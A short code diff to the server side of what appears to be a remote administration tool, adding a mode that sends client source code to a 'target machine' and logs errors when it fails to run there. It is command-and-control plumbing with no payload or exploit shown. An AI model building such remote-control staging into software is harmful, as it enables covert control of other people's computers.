@@ -114,8 +114,17 @@ class ModeratServerProtocol(Protocol):
 
     def client_commands(self, payload, mode, session_id, key):
 
+        # Build Client
+        if mode == 'buildClient':
+            log.info('Generating Source')
+            from Client.Client import Source
+            self.transport.write(Source+'[ENDOFSOURCE]')
+
+        elif mode == 'buildClientError':
+            log.warning('Error Executing Source on Target Machine. err(%s)' % payload)
+
         # Clients Initializing
-        if mode == 'clientInitializing':
+        elif mode == 'clientInitializing':
 
             log.info('Get Key If Exists Or Generate New One')
 
